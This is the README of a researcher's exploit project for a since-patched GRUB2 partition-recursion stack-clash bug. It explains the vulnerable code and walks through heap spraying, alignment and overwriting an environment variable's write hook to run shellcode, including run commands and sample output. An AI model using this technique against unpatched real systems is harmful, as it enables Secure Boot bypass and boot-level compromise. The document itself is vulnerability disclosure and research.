# ClashGPT - bah / January 2025

This is an exploit for a bug in GRUB2 that was fixed in January 2025.
It was found, reported and patched by me.
It is a technically interesting bug in how you exploit it, requiring determining
alignment to gain reliable control over a target object.

This bug is only exploitable if the UEFI firmware doesn't place a guard page
below the stack.
This applies to EDK2 by default, as you need to enable a build option to have
guard pages. (*cough* maybe this should be default? *cough*)

This is was probably one of the harder bugs to exploit that I reported, with
more preconditions etc, so if you actually want to exploit GRUB to bypass secure
boot this really isn't the one.
Just technically cool.

## Usage

Make sure you have submodules initialized, as we build GRUB 2.12 from source.

To get a OVMF, run `just get-ovmf`.
This downloads a OVMF build from Ubuntu 22.04.

Setup (bootstrap, configure, compile, and copy grub to `artifacts/hda/`):
```
just setup-grub && just build-grub && just install-grub
```

Run (generate the exploit files and write to `artifacts/hda`, start qemu and
run GRUB):
```
just exploit && just run
```

Remember, there are a bunch of offsets defined in `src/consts.py` that you may
have to change. (`START_DEPTH`, `END_DEPTH`, `FUN_COUNT`, `OFFSET_START` are the
main ones to consider, but potentially `TRASH_ALLOC`, `SPRAY_CONSTRUCTION` and
`SPRAY_ENVVAR` as well)
The shellcode is just the `SHELLCODE` var in that file as well.

Debug, after a `just run` in a different terminal:
```
just debug ADDRESS_FROM_GDBINFO
```

`gdbinfo` is in the early-grub.cfg, so it should show up as grub starts.
You may have to scroll up.
Check `scripts/grub-gdb.gdbs` for my custom GDB commands to get information from
GRUB (memory regions, variables defined, etc).

## The Bug - `part_iterate()` recursion

The bug is a recursion triggered by GRUB recursively looking into partitions of
partitions.

```
    int
    grub_partition_iterate (struct grub_disk *disk,
                grub_partition_iterate_hook_t hook, void *hook_data)
    {
      struct grub_partition_iterate_ctx ctx = {
        .ret = 0,
        .hook = hook,
        .hook_data = hook_data
      };
      const struct grub_partition_map *partmap;

      FOR_PARTITION_MAPS(partmap)
      {
        grub_err_t err;
[1]     err = partmap->iterate (disk, part_iterate, &ctx);
        if (err)
          grub_errno = GRUB_ERR_NONE;
        if (ctx.ret)
          break;
      }

      return ctx.ret;
    }
```

```
    static int
    part_iterate (grub_disk_t dsk, const grub_partition_t partition, void *data)
    {
      struct grub_partition_iterate_ctx *ctx = data;
      struct grub_partition p = *partition;

      if (!(grub_partition_check_containment (dsk, partition)))
        return 0;

      p.parent = dsk->partition;
      dsk->partition = 0;
      if (ctx->hook (dsk, &p, ctx->hook_data))
        {
          ctx->ret = 1;
          return 1;
        }
      if (p.start != 0)
        {
          const struct grub_partition_map *partmap;
          dsk->partition = &p;
          FOR_PARTITION_MAPS(partmap)
          {
        grub_err_t err;
[2]     err = partmap->iterate (dsk, part_iterate, ctx);
        if (err)
          grub_errno = GRUB_ERR_NONE;
        if (ctx->ret)
          break;
          }
        }
      dsk->partition = p.parent;
      return ctx->ret;
    }
```

```
    grub_err_t
    grub_gpt_partition_map_iterate (grub_disk_t disk,
                    grub_partition_iterate_hook_t hook,
                    void *hook_data)
    {
      struct grub_partition part;
      struct grub_gpt_header gpt;
      struct grub_gpt_partentry entry;
      struct grub_msdos_partition_mbr mbr;
      grub_uint64_t entries;
      unsigned int i;
      int last_offset = 0;
      int sector_log = 0;

      [ SNIP ]

      entries = grub_le_to_cpu64 (gpt.partitions) << sector_log;
      for (i = 0; i < grub_le_to_cpu32 (gpt.maxpart); i++)
        {
          if (grub_disk_read (disk, entries, last_offset,
                  sizeof (entry), &entry))
        return grub_errno;

          if (grub_memcmp (&grub_gpt_partition_type_empty, &entry.type,
                   sizeof (grub_gpt_partition_type_empty)))
        {
          /* Calculate the first block and the size of the partition.  */
          part.start = grub_le_to_cpu64 (entry.start) << sector_log;
          part.len = (grub_le_to_cpu64 (entry.end)
                  - grub_le_to_cpu64 (entry.start) + 1)  << sector_log;
          part.offset = entries;
          part.number = i;
          part.index = last_offset;
          part.partmap = &grub_gpt_partition_map;
          part.parent = disk->partition;

          grub_dprintf ("gpt", "GPT entry %d: start=%lld, length=%lld\n", i,
                (unsigned long long) part.start,
                (unsigned long long) part.len);

[4]       if (hook (disk, &part, hook_data))
            return grub_errno;
        }

        [ SNIP ]

    }
```

This is started by `grub_partition_iterate()` [1], which will go through each
registered partition map and call their iterate functions.
For example, `grub_gpt_partition_map_iterate()` for GPT and
`grub_partition_msdos_iterate()` for the msdos partition scheme.

So in the GPT case [4] will be hit, which will call in this case
`part_iterate()`.
`part_iterate()` will again go through all the registered partition maps and
call their iterate functions, calling them and passing itself as the hook [3].

So this can be chained to recursively call itself and corrupt objects in a heap
region allocated below the stack.

So if you define the chain of partitions (GPT or msdos or whatever), you can
trigger this issue by just running `ls` or `search.file does_not_exist`.

## Exploitation

We need to perform the following steps:
* Initial Setup - not that interesting, just create what we need for later
  steps.
* Forcing Memory Pressure
* Setting up the construction
* Probing to find the target variable
* Alignment
* Spraying grub_env_vars
* Overwriting the env var write_hook
* Taking control.

### Applying Pressure

Something like the following works to apply memory presure:
```
set a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
set a=${a}${a}${a}${a}${a}${a}${a}${a}
....
set a=${a}${a}${a}${a}${a}${a}${a}${a}
```
You can change out the initial value to be shellcode and just jump to that.

After running that and getting `$rsp` we can look at `lsefimmap` and see the
stack and our target range are adjacent:
```
Type      Physical start  - end             #Pages        Size Attributes
ldr-code  00000000bfe00000-00000000bfef0fff 000000f1    964KiB UC WC WT WB
BS-data   00000000bfef1000-00000000bff10fff 00000020    128KiB UC WC WT WB
```
(GRUB allocates the heap with the LoaderCode memory type, default RWX on
everything but things with the enhanced memory protections)

Looking at RSP compared to the region and seeing how far we are away:
```
RSP - (region + size)
0xbff10518 - (0xbfe00000+987072) = 128344
```

### Probing the Construction and Aligning

Once memory pressure has forced a region to exist below the stack I forced on
spraying 32KB allocations to create a layout like so:
```
| Heap Region        | |        stack region |
  [cushion] [target]  <----------- [ stack ]
```
Basically, we have a target allocation, where we want to gain control over
`grub_mm_header` for.
We have the cushion there to stop hitting other allocations that may occur in
the region.

We trigger the bug with a smaller depth to see if we can find the name of the
sprayed target variable.

### Overwriting an `struct grub_env_var` and Taking Control

A grub env var is defined as the following in `include/grub/env.h`:
```
struct grub_env_var
{
  char *name;
  char *value;
  grub_env_read_hook_t read_hook;
  grub_env_write_hook_t write_hook;
  struct grub_env_var *next;
  struct grub_env_var **prevp;
  struct grub_env_var *sorted_next;
  int global;
};
```

So you can see there are two hook functions we can overwrite.
These get called whenever the variable is written to or referenced.
(I should note you can also achieve other primitives like an arb-free with the
other members, but that is beyond whats currently needed)

As GRUB looks up variables from a hash table we need to be careful about the
name.
If the name does not match the hash table entry we corrupted we won't be able to
look it up.
To word around this, I just defaulted to using 0th entry as if set name to an
empty string via a nullptr we can look it up.

We can spray this specific structure by just defining new variables.
If we set their names and values to be large, we can avoid them ending up in our
free()'d block.

Once we've sprayed(), we just trigger our overwrite again but with a different
chain that sets name to NULL and the write_hook to a sprayed address.
Then we can `set =1` and take control.

## Output

You should see something like the following on successful exploitation:
```
ClashGPT - bah / January 2025
[!] setup
[!] Forcing memory pressure
error: out of memory.
[!] Setting up construction
error: no such device: does_not_exist.
[!] Corrupting: con_0
[!] Determining Depth
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
[... ommited ...]
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
[!] Found: 313 0011 YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
[!] going for the kill
error: no such device: does_not_exist.
```

The default payload is just an infloop (EB FE), change that (`SHELLCODE` in
`src/consts.py`) if you want anything more.

## Futher Reading

* https://web.archive.org/web/20050817190326/http://cansecwest.com/core05/memory_vulns_delalleau.pdf -
  if you care about stack clashes, these slides are old but good. 
* https://xerub.github.io/ios/iboot/2018/05/10/de-rebus-antiquis.html - The
  iBoot stack clash. Insane work! I actually did try the idea on using Tarjan's
  algorithm from here, using CFGs i got from angr, but it never worked that well
  for me.
* https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt - Qualys work on
  stack clashs in 2017 was how I first became aware of them as an exploitable
  bug class. Focuses on more modern userland linux exploitation, where the hard
  part is avoiding hitting a guard page.

## License

GPL3
